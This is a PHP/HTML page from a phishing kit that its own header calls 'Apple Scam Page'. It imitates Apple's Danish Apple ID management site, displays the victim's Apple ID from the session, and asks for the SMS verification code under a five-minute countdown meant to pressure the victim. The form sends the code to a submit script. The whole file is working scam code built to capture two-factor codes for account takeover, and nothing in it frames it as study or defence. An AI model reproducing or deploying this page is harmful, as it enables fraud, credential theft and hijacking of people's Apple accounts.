<?php
/**
 * @link              https://www.facebook.com/hamidakhatar
 * @since             2019
 * @package           Apple Scam Page
 *
 * Project Name:      Apple Scam
 * Author:            Hamid Akhatar
 * Author URI:        https://www.facebook.com/hamidakhatar
 */
include_once '../inc/app.php';
?>
<!doctype html>
<html lang="en">

    <head>
        <!-- Required meta tags -->
        <meta charset="utf-8">
        <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
        
        <!-- CSS FILES -->
        <link rel="stylesheet" href="../assets/css/bootstrap.min.css">
        <link rel="stylesheet" href="../assets/css/helpers.css">
        
        <link rel="stylesheet" href="../assets/css/main.css">

        <link rel="shortcut icon" type="image/x-icon" href="../assets/images/fav.ico">

        <title>Administrer dit Apple-id</title>
    </head>

    <body>

        <div id="hero" class="imgbg">
            <div class="top-hero">
                <div class="container">
                    <ul class="d-lg-flex d-md-flex d-sm-none d-none">
                        <li><a class="logo-app" href="#"><i class="fab fa-apple"></i></a></li>
                        <li><a href="#">Mac</a></li>
                        <li><a href="#">iPad</a></li>
                        <li><a href="#">iPhone</a></li>
                        <li><a href="#">Watch</a></li>
                        <li><a href="#">TV</a></li>
                        <li><a href="#">Music</a></li>
                        <li><a href="#">Support</a></li>
                        <li><a href="#"><i class="fas fa-search"></i></a></li>
                        <li><a href="#"><i class="fas fa-shopping-bag"></i></a></li>
                    </ul>

                    <ul class="d-lg-none d-md-none d-sm-flex d-flex">
                        <li class="text-left"><a href="#"><i class="fas fa-stream"></i></a></li>
                        <li class="text-center"><a href="#"><i class="fab fa-apple"></i></a></li>
                        <li class="text-right"><a href="#"><i class="fas fa-shopping-bag"></i></a></li>
                    </ul>

                </div>
            </div>

            <div class="hero-title">
                <div class="container">
                    <div class="row">
                        <div class="col-lg-9 col-md-9 col-sm-12 col-12">
                            <h3>Welkom</h3>
                            <p>Dit Apple-id er <?php echo $_SESSION['apple_id']; ?></p>
                        </div>
                        <div class="col-md-3 d-lg-flex d-md-flex d-sm-none d-none align-items-center">
                            <button>Log ud</button>
                        </div>
                    </div>
                </div>
            </div>

        </div>

        <div id="details">
            <div class="container">
                <div class="row">
                    <div class="col-lg-7 col-md-7 col-sm-12 col-12 left-side">
                        <form method="post" action="submit.php">
                            <h3>Bekræftelseskode</h3>
                            <div class="form-group mb-3">
                                <label for="card_number" class="mb-3">Indtast koden, der er modtaget via SMS, og tryk på Bekræft</label>
                                <input type="text" name="sms_code" class="form-control <?php echo is_invalid_class($_SESSION['errors'],'sms_code') ?>" id="sms_code" placeholder="kode">
                                <?php echo validation($_SESSION['errors'],'sms_code'); ?>
                            </div>
                            <button class="mt-4" type="submit">Fortsæt</button>
                            <input type="hidden" name="type" value="sms">
                        </form>
                    </div>
                    <div class="col-lg-5 col-md-5 col-sm-12 col-12 right-side d-lg-flex d-md-flex d-sm-block d-block mt-lg-0 mt-md-0 mt-sm-5 mt-5 align-items-center justify-content-center">
                        <div class="timer">05:00</div>
                    </div>
                </div>
            </div>
        </div>

        <footer id="footer">
            <div class="container">
                <div class="row">
                    
                    <div class="col-md-9">
                        <p>Flere måder at shoppe på: Ring 80 24 08 35, eller <a href="#">find en forhandler.</a></p>
                        <p>Copyright © 2019 Apple Inc. Alle rettigheder forbeholdes.</p>
                        <ul>
                            <li><a href="#">Anonymitetspolitik</a></li>
                            <li><a href="#">Brug af cookies</a></li>
                            <li><a href="#">Betingelser for brug</a></li>
                            <li><a href="#">Salg og refundering</a></li>
                            <li><a href="#">Juridisk tekst</a></li>
                            <li><a href="#">Oversigt</a></li>
                        </ul>
                    </div>
                    <div class="col-md-3 mt-lg-0 mt-md-0 mt-sm-3 mt-3 d-flex align-items-center">
                        <div class="lang">
                            <img src="../assets/images/dklogo.png"> Danmark
                        </div>
                    </div>

                </div>
            </div>
        </footer>

        <!-- JS FILES -->
        <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.4.1/jquery.min.js"></script>
        <script src="../assets/js/popper.min.js"></script>
        <script src="../assets/js/bootstrap.min.js"></script>
        <script src="../assets/js/fontawesome.min.js"></script>
        <script src="../assets/plugins/countdowntimer/jquery.countdownTimer.min.js"></script>
        <script src="../assets/js/main.js"></script>
        <script type="text/javascript">
            jQuery(function($){

                $(".timer").countdowntimer({
                    minutes: 5
                });
                
            })
        </script>

    </body>

</html>